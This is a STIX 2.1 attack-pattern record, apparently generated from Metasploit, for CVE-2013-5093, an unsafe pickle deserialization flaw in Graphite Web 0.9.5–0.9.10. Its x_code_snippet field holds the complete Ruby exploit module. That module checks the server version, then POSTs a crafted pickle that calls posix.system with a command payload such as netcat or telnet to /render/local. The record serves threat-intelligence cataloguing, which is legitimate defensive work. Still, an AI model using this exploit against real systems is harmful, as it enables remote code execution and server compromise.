{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c7e36a19-73bf-43e9-b0a6-75f712ed4c9c",
    "created": "2024-08-14T17:13:16.293444Z",
    "modified": "2024-08-14T17:13:16.293448Z",
    "name": "Graphite Web Unsafe Pickle Handling",
    "description": " This module exploits a remote code execution vulnerability in the pickle handling of the rendering code in the Graphite Web project between version 0.9.5 and 0.9.10 (both included). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/graphite_pickle_exec.rb",
            "external_id": "graphite_pickle_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-5093"
        },
        {
            "source_name": "reference",
            "url": "http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' \t\t\t=> 'Graphite Web Unsafe Pickle Handling',\n      'Description' \t=> %q{\n        This module exploits a remote code execution vulnerability in the pickle\n        handling of the rendering code in the Graphite Web project between version\n        0.9.5 and 0.9.10 (both included).\n      },\n      'Author' \t\t=>\n        [\n          'Charlie Eriksen', # Initial discovery and exploit\n          'funkypickle' # Version check to prove vulnerable\n        ],\n      'License' \t\t=> MSF_LICENSE,\n      'References'    =>\n        [\n          [ 'CVE', '2013-5093'],\n          [ 'URL', 'http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/']\n        ],\n      'Platform' \t\t => 'unix',\n      'Arch' \t\t\t => ARCH_CMD,\n      'Privileged' \t => false,\n      'Targets'\t\t => [ ['Automatic', {} ] ],\n      'DisclosureDate' => '2013-08-20',\n      'DefaultTarget'  => 0,\n      'Payload'\t\t =>\n        {\n          'DisableNops' => true,\n          'Space'\t\t  => 16384,\n          'Compat'\t  =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'python generic telnet netcat perl ruby'\n            }\n        }))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The path to a vulnerable application', '/'])\n      ])\n\n  end\n\n  def check\n    res1 = send_request_cgi({\n      # trailing slash required\n      'uri'      => normalize_uri(target_uri.path, 'version/'),\n      'method' => 'GET'\n    })\n\n    res2 = send_request_cgi({\n      'uri' \t => normalize_uri(target_uri.path, 'render', 'local'),\n      'method' => 'POST'\n    })\n\n    if (res1 and %w(0.9.5 0.9.10).include?(res1.body.strip)) and (res2 and res2.code == 500)\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    data = \"line\\ncposix\\nsystem\\np1\\n(S'#{payload.encoded}'\\np2\\ntp3\\nRp4\\n.\"\n\n    print_status(\"Sending exploit payload...\")\n\n    response = send_request_cgi({\n      'uri' \t => normalize_uri(target_uri.path, 'render', 'local'),\n      'method' => 'POST',\n      'data' \t => data\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-08-20",
    "x_mitre_platforms": [
        "unix'"
    ]
}